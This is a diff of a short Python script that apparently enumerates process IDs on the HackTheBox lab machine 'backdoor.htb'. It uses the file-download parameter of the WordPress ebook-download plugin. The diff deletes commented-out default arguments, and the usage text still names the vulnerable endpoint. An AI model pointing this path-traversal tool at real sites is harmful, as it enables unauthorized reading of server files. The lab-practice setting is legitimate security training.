@@ -25,8 +25,4 @@ except:
     print('url = string (e.g. http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=) \nmin_lenght = int (e.g. 50) \ntotal_pid = int (e.g. 5000)')
     sys.exit(1)
 
-#url_main = 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl='
-#lenght = 82
-#total_pid = 5000
-
 pids(url_main, lenght, total_pid)
